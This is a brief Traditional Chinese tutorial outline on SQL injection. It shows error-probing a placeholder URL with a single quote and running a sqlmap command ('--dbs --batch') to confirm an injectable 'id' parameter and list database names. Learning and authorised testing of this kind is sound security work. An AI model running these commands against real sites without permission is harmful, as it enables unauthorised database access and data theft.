# 融合 sqlmap 的 SQL 注入實戰步驟

## 步驟 (1)

- 範例網址: [https://xxx.com/news.php?id=1](https://xxx.com/news.php?id=1)
- 於問題網址後加上一符號「'」，系統回應錯誤訊息，判斷此處可能存在 SQL Injection 漏洞

## 步驟 (2)

- 以 sqlmap 輔助測試
- Command: sqlmap -u [https://xxx.com/news.php?id=1] --dbs --batch

## 步驟 (3)

- 發現 GET 參數「id」存在漏洞
- 可發現資料庫名稱
